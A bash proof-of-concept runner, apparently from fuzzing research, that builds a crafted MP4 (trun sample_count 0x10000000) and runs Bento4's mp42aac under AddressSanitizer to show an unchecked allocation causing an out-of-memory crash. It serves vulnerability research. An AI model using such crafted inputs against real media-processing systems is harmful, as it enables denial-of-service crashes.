#!/usr/bin/env bash
# VULN 003 PoC Runner
# AP4_TrunAtom unchecked SetItemCount failure -> OOM / bad_alloc crash
#
# The trun box sample_count=0x10000000 causes AP4_Array::SetItemCount to allocate
# 0x10000000 * 16 = ~4 GB via operator new inside AP4_TrunAtom's parsing constructor.
# The return value of SetItemCount is not checked. This exhausts available memory,
# triggering an ASAN-detected OOM crash during subsequent allocations in the same
# parsing path (ContainerAtom::ReadChildren -> CreateAtomFromStream -> ...).
#
# ASAN option: soft_rss_limit_mb=400  — caps physical RSS to 400 MB so that the
# oversized Entry array forces a measurable allocation failure quickly.

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Config_h"
TARGET="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
MP4="$POC_DIR/vuln_003.mp4"
RESULT="$POC_DIR/vuln_003_result.txt"
ASAN_LOG_BASE="$POC_DIR/asan_003.log"

echo "[*] Step 1: Generating malicious MP4..."
python3 "$POC_DIR/vuln_003_gen.py"

echo "[*] Step 2: Running mp42aac (ASAN, RSS limit 400 MB)..."
# soft_rss_limit_mb=400: once physical RSS exceeds 400 MB (from the massive 4 GB
# Entry array allocation in AP4_TrunAtom), ASAN's allocator reports rss-limit-exceeded
# on any subsequent operator new call in the same box-parsing call chain.
ASAN_OPTIONS="abort_on_error=0:soft_rss_limit_mb=400:log_path=${ASAN_LOG_BASE}" \
    "$TARGET" "$MP4" /dev/null > "$RESULT" 2>&1 || true

echo "[*] Step 3: Collecting ASAN / UBSAN output..."
for logfile in "${ASAN_LOG_BASE}".*; do
    if [ -f "$logfile" ]; then
        echo "--- ASAN log: $logfile ---" >> "$RESULT"
        cat "$logfile" >> "$RESULT"
    fi
done
if [ -f "$ASAN_LOG_BASE" ]; then
    echo "--- ASAN log (no PID suffix) ---" >> "$RESULT"
    cat "$ASAN_LOG_BASE" >> "$RESULT"
fi

echo "[*] Done. Results in: $RESULT"
cat "$RESULT"
